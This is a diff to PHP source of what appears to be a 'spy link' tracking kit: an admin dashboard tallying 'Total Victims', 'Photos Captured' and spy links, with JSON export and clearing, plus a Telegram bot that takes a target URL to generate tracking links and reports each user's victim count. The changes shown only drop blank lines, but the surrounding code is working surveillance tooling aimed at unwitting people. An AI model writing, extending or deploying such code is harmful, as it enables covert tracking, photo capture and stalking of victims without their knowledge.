@@ -2,7 +2,6 @@ RewriteEngine On
 RewriteCond %{REQUEST_FILENAME} !-f
 RewriteCond %{REQUEST_FILENAME} !-d
 RewriteRule ^([a-zA-Z0-9_]+)$ index.php?id=$1 [L]
-
 <Files "*.json">
     Order Allow,Deny
     Deny from all
@@ -21,7 +20,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['login'])) {
         $_SESSION['admin'] = true;
     }
 }
-
 if (!isset($_SESSION['admin']) || $_SESSION['admin'] !== true) {
     ?>
     <!DOCTYPE html>
@@ -52,7 +50,6 @@ if (!isset($_SESSION['admin']) || $_SESSION['admin'] !== true) {
     <?php
     exit;
 }
-
 $visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
 $links = json_decode(file_get_contents("links.json"), true) ?? [];
 $totalVictims = count($visitors);
@@ -95,7 +92,6 @@ $totalVictims = count($visitors);
             <a href="?logout=1" class="btn btn-danger">🚪 Logout</a>
         </div>
     </div>
-    
     <div class="stats">
         <div class="stat-box"><h2><?= $totalVictims ?></h2><p>Total Victims</p></div>
         <?php
@@ -107,8 +103,7 @@ $totalVictims = count($visitors);
         <div class="stat-box"><h2><?= $totalPhotos ?></h2><p>Photos Captured</p></div>
         <div class="stat-box"><h2><?= count($links) ?></h2><p>Spy Links Created</p></div>
     </div>
-
-    <div style="margin:20px 0;">
+<div style="margin:20px 0;">
         <h3>🔗 All Spy Links</h3>
         <?php foreach ($links as $code => $data): ?>
             <div class="link-item">
@@ -118,7 +113,6 @@ $totalVictims = count($visitors);
             </div>
         <?php endforeach; ?>
     </div>
-
     <?php
     // Export JSON
     if (isset($_GET['export'])) {
@@ -127,7 +121,6 @@ $totalVictims = count($visitors);
         echo json_encode($visitors, JSON_PRETTY_PRINT);
         exit;
     }
-    
     // Clear all
     if (isset($_GET['clear'])) {
         file_put_contents("visitors.json", json_encode([]));
@@ -137,15 +130,13 @@ $totalVictims = count($visitors);
         echo "<script>location.href='?'</script>";
         exit;
     }
-    
     // Logout
     if (isset($_GET['logout'])) {
         session_destroy();
         echo "<script>location.href='?'</script>";
         exit;
     }
-
-    // Display visitors
+// Display visitors
     if (empty($visitors)):
     ?>
         <div class="empty">
@@ -185,27 +176,20 @@ $totalVictims = count($visitors);
     <?php endif; ?>
 </body>
 </html>
-
 <?php
 require_once 'config.php';
-
 $botToken = $config['bot_token'];
 $website = $config['website'];
-
 // Create files if not exist
 if (!file_exists("links.json")) {
     file_put_contents("links.json", json_encode([]));
 }
-
 $content = file_get_contents("php://input");
 $update = json_decode($content, true);
-
 if (!$update) exit;
-
 $chatId = $update["message"]["chat"]["id"] ?? null;
 $text = $update["message"]["text"] ?? "";
 $callback = $update["callback_query"] ?? null;
-
 // /start
 if ($text == "/start") {
     $keyboard = [
@@ -222,18 +206,15 @@ if ($callback && $callback["data"] == "generate") {
     sendMessage($callback["from"]["id"], "📥 *Send target URL*\nExample: `https://youtube.com`");
     answerCallback($callback["id"]);
 }
-
 // Stats button
 if ($callback && $callback["data"] == "stats") {
     $allVisitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
     $myVisitors = [];
-    
     foreach ($allVisitors as $id => $data) {
         if (isset($data['generated_by']) && $data['generated_by'] == $callback["from"]["id"]) {
             $myVisitors[] = $data;
         }
     }
-    
     $total = count($myVisitors);
     sendMessage($callback["from"]["id"], "📊 *Your Victims:* $total\n\n🔗 Generate more links to track more people!");
     answerCallback($callback["id"]);
